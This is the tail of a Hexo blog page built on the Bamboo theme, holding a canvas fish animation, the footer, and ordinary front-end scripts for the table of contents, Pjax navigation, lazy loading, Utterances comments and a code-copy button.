      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
    },
    getRandomValue: function (t, i) {
      return t + (i - t) * Math.random()
    },
    reverseVertical: function () {
      this.isOut = !this.isOut, this.ay *= -1
    },
    controlStatus: function (t) {
      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
    },
    render: function (t) {
      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
    }
  }, $(function () {
    RENDERER.init()
    $('.dark').click(function () {
      setTimeout(() => {
        RENDERER.setFishColor();
        RENDERER.context.fill();
      });
    })
  });
</script>
  
  <div class="footer bg-color">
    <div class="footer-main">
      
        
          <div class="link">
            
          </div>
        
      
        
          <div class="footer-copyright">
            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">yuang01</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>

          </div>
        
      
        
          <div class="footer-custom">
            
          </div>
        
      
    </div>
  </div>



    <!-- 渲染暗黑按钮 -->
    
    <!-- 渲染回到顶部按钮 -->
    
      <div class="goTop top-btn-color" pointer>
  <i class="fas fa-arrow-up" aria-hidden="true"></i>
</div>
<script defer src="/js/goTop.js"></script>

    
    <!-- 渲染左下角音乐播放器 -->
    

    <!-- 图片放大 -->
    
      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
    

    <!-- 百度解析 -->
    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <!-- 背景彩带 -->
    
      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
    

    <script src="/js/utils/index.js"></script>
    <script src="/js/app.js"></script>
    
    <!-- 文章目录所需js -->
<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
<script src="/js/tocbot/tocbot.min.js"></script> -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">

<script>
  var headerEl = 'h2, h3, h4',  //headers 
    content = '.post-detail',//文章容器
    idArr = {};  //标题数组以确定是否增加索引id
  //add #id
  var option = {
    // Where to render the table of contents.
    tocSelector: '.toc',
    // Where to grab the headings to build the table of contents.
    contentSelector: content,
    // Which headings to grab inside of the contentSelector element.
    headingSelector: headerEl,
    scrollSmooth: true,
    scrollSmoothOffset: -70,
    // headingsOffset: -($(window).height() * 0.4 - 45),
    headingsOffset: -($(window).height() * 0.4 - 70),
    // positionFixedSelector: '.toc-main',
    // positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto',
    activeLinkClass: 'is-active-link',
    orderedList: true,
    collapseDepth: 20,
    // onClick: function (e) {},
  }
  if ($('.toc').length > 0) {

    $(content).children(headerEl).each(function () {
      //去除空格以及多余标点
      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');

      headerId = headerId.toLowerCase();
      if (idArr[headerId]) {
        //id已经存在
        $(this).attr('id', headerId + '-' + idArr[headerId]);
        idArr[headerId]++;
      }
      else {
        //id未存在
        idArr[headerId] = 1;
        $(this).attr('id', headerId);
      }
    });

    document.addEventListener("DOMContentLoaded", function () {
      tocbot.init(option);
      mobileTocClick();
    });

  }

  window.tocScrollFn = function () {
    return bamboo.throttle(function () {
      findHeadPosition();
    }, 100)()
  }
  window.addEventListener('scroll', tocScrollFn);

  const findHeadPosition = function (top) {
    if ($('.toc-list').length <= 0) {
      return false;
    }
    setTimeout(() => {  // or DOMContentLoaded 
      autoScrollToc();
    }, 0);
  }

  const autoScrollToc = function () {
    const $activeItem = document.querySelector('.is-active-link');
    const $cardToc = document.querySelector('.toc-content');
    const activePosition = $activeItem.getBoundingClientRect().top
    const sidebarScrollTop = $cardToc.scrollTop
    if (activePosition > (document.documentElement.clientHeight - 100)) {
      $cardToc.scrollTop = sidebarScrollTop + 150
    }
    if (activePosition < 150) {
      $cardToc.scrollTop = sidebarScrollTop - 150
    }
  }

  document.addEventListener('pjax:send', function () {
    if ($('.toc').length) {
      tocbot.destroy();
    }
  });

  document.addEventListener('pjax:complete', function () {
    if ($('.toc').length) {
      tocbot.init(option);
      mobileTocClick();
    }
  });
  
  // 手机端toc按钮点击出现目录
  const mobileTocClick = function () {
    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
    let right = '45px';
    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
      right = '100px'
    }
    const mobileToc = {
      open: () => {
        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
      },

      close: () => {
        $cardTocLayout.style.animation = 'toc-close .2s'
        setTimeout(() => {
          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
        }, 100)
      }
    }
    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
      else mobileToc.close()
    })

    $cardToc.addEventListener('click', (e) => {
      if (window.innerWidth < 992) { // 小于992px的时候
        mobileToc.close()
      }
    })
  }
</script>

<style>
  /* .is-position-fixed {
    position: sticky !important;
    top: 74px;
  }

  .toc-main ul {
    counter-reset: show-list;
  }

  .toc-main ul li::before {
    content: counter(item)".";
    display: block;
    position: absolute;
    left: 12px;
    top: 0;
  } */
</style>
 

<!-- 设置导航背景 -->
<script>
  let setHeaderClass = () => {
    const nav = $('#navHeader');
    const navTop = nav.outerHeight();
    const winTop = $(window).scrollTop();
    if(winTop > navTop) {
      nav.addClass('header-bg-color');
    }
    else {
      nav.removeClass('header-bg-color');
    }
  };

  let scrollCollect = () => {
    return bamboo.throttle(function (e) {
      setHeaderClass();
    }, 200)()
  }

  let initHeaderBg = () => {
    setHeaderClass();
  }

  setHeaderClass();
  window.addEventListener('scroll', scrollCollect);

  document.addEventListener('pjax:send', function () {
    window.removeEventListener('scroll', scrollCollect)
  })
  document.addEventListener('pjax:complete', function () {
    window.addEventListener('scroll', scrollCollect);
    setHeaderClass();
  })
</script> 

<!-- 渲染issues标签里的内容 -->
<script>
  function loadIssuesJS() {
    if ($(".post-detail").find(".issues-api").length == 0) {
      return;
    } 
    loadScript('/js/issues/index.js');
  };
  $(function () {
    loadIssuesJS();
  });
  document.addEventListener('pjax:complete', function () {
    if (typeof IssuesAPI == "undefined") {
      loadIssuesJS();
    }
  })
</script>

<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
<script>
  function loadPhotoOnlineJS() {
    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
      return;
    } 
    loadScript('/js/getPhotoOnline/index.js');
  };
  $(function () {
    loadPhotoOnlineJS();
  });
  document.addEventListener('pjax:complete', function () {
    if (typeof getPhotoJson == "undefined") {
      loadPhotoOnlineJS();
    }
  })
</script>

<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
<script>
  function loadTalkOnlineJS() {
    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
      return;
    } 
    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
    loadScript('/js/getTalkOnline/index.js');
  };
  $(function () {
    loadTalkOnlineJS();
  });
  document.addEventListener('pjax:complete', function () {
    if (typeof getTalkJson == "undefined") {
      loadTalkOnlineJS();
    }
  })
</script>

<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
<script>
  function loadSiteOnlineJS() {
    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
      return;
    } 
    loadScript('/js/getSiteOnline/index.js');
  };
  $(function () {
    loadSiteOnlineJS();
  });
  document.addEventListener('pjax:complete', function () {
    if (typeof getSiteJson == "undefined") {
      loadSiteOnlineJS();
    }
  })
</script>

<!-- 输入框打字特效 -->
<!-- 输入框打字特效 -->

  <script src="/js/activate-power-mode.js"></script>
  <script>
    POWERMODE.colorful = true;  // 打开随机颜色特效
    POWERMODE.shake = false;    // 关闭输入框抖动
    document.body.addEventListener('input', POWERMODE);//监听打字事件
  </script>


<!-- markdown代码一键复制功能 -->

  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
  <script src="/js/clipboard/clipboard.min.js"></script>
  <div id="appCopy">
  </div>
  <script data-pjax>
    var vm = new Vue({
      el: '#appCopy',
      data: {
      },
      computed: {
      },
      mounted() {
        const that = this;
        var copy = 'copy';
        /* code */
        var initCopyCode = function () {
          var copyHtml = '';
          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
          copyHtml += '</button>';
          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
          $(".post-detail pre").not('.gutter pre').before(copyHtml);
          new ClipboardJS('.btn-copy', {
            target: function (trigger) {
              return trigger.nextElementSibling;
            }
          });
        }
        initCopyCode();
        $('.btn-copy').unbind('click').bind('click', function () {
          doSomething();
        })
        $(document).unbind('keypress').bind('keypress', function (e) {
          if (e.ctrlKey && e.keyCode == 67) {
            doSomething();
          }
        })

        function doSomething() {
          that.$notify({
            title: "Placeholder",
            content: "Where does this come from",
            type: 'success'
          })
        }
      },
      methods: {
      },
      created() { }
    })
  </script>
  

<!-- 图片懒加载 -->
<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>


<!-- 卡片滚动动画 -->
   

<!-- 评论所需js -->

  
        <script type="text/javascript">
  var utteranceComment = {};

  function check_utterance() {
    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');
    if (isDark) {
      utteranceComment.Theme = 'github-dark';
    } else {
      utteranceComment.Theme = 'github-light';
    }

    return document.getElementById("gitment-container");
  }
  comment_el = '#gitment-container';
  load_utterance = function () {
    if ($(comment_el).length) {
      // 匿名函数，防止污染全局变量
      const HEAD = check_utterance();

      var utterances = document.createElement('script');
      utterances.type = 'text/javascript';
      utterances.async = true;
      utterances.setAttribute('issue-term', 'pathname')
      utterances.setAttribute('theme', utteranceComment.Theme)
      utterances.setAttribute('repo', '')
      utterances.crossorigin = 'anonymous';
      utterances.src = 'https://utteranc.es/client.js';
      // content 是要插入评论的地方
      document.getElementById('gitment-container').appendChild(utterances);

    }
  }

  function dark_utterance() {
    const HEAD = check_utterance();
    if (!HEAD) return;
    const message = {
      type: 'set-theme',
      theme: utteranceComment.Theme
    };
    const utteranceIframe = document.querySelector('iframe');
    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
  }

  $(document).ready(load_utterance);
  document.addEventListener('pjax:complete', function () {
    load_utterance();
  });

  $('.dark').click(function () {
    setTimeout(() => {
      dark_utterance();
    });
  })

</script>

<style>
  .utterances {
    max-width: inherit !important;
  }
</style>
      


<!-- 鼠标点击特效 -->
<!-- 爱心点击 -->

  
    <script async src="/js/cursor/text.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>


<!-- 轮播图标签 -->
<script>
  var bambooSwiperTag = {};
  function load_swiper() {
    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
      pjax_swiper();
    });
  }

  load_swiper();

  function pjax_swiper() {
    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      autoplay: true ? {
        delay: 3000,
        stopOnLastSlide: false,
        disableOnInteraction: false,
      } : false,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
      on:{
        init: function(){
          swiperAnimateCache(this); //隐藏动画元素 
          swiperAnimate(this); //初始化完成开始动画
        }, 
        slideChangeTransitionEnd: function(){ 
          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
        } 
      }
    });
  }

  document.addEventListener('pjax:complete', function () {
    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
    if (typeof bambooSwiperTag.swiper === "undefined") {
      load_swiper();
    } else {
      pjax_swiper();
    }
  });
</script>
    <!-- pjax -->
    

<!-- pjax -->


  <script src="/js/pjax@0.2.8/index.js"></script>
  
    <div class="pjax-animate">
  
    <div class="loading-circle"><div id="loader-circle"></div></div>
    <script>
      window.ShowLoading = function() {
        $(".loading-circle").css("display", "block");
      };
      window.HideLoading = function() {
        $(".loading-circle").css("display", "none");
      }
    </script>
  
	<script>
    document.addEventListener('pjax:complete', function () {
      window.HideLoading();
    })
    document.addEventListener('pjax:send', function () {
      window.ShowLoading();
    })
    document.addEventListener('pjax:error', function () {
      window.HideLoading();
    })
	</script>
</div>

  

  <script>
    var pjax = new Pjax({
      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
      timeout: 5000
    });

    document.addEventListener('pjax:send', function (e) {

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');

    })
    
    document.addEventListener('pjax:complete', function () {
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
    });

    document.addEventListener('pjax:error', function (e) {
      window.location.href = e.triggerElement.href;
    })
    
    // 刷新不从顶部开始
    document.addEventListener("DOMContentLoaded", function () {
      history.scrollRestoration = 'auto';
    })
  </script>



  </body>
</html>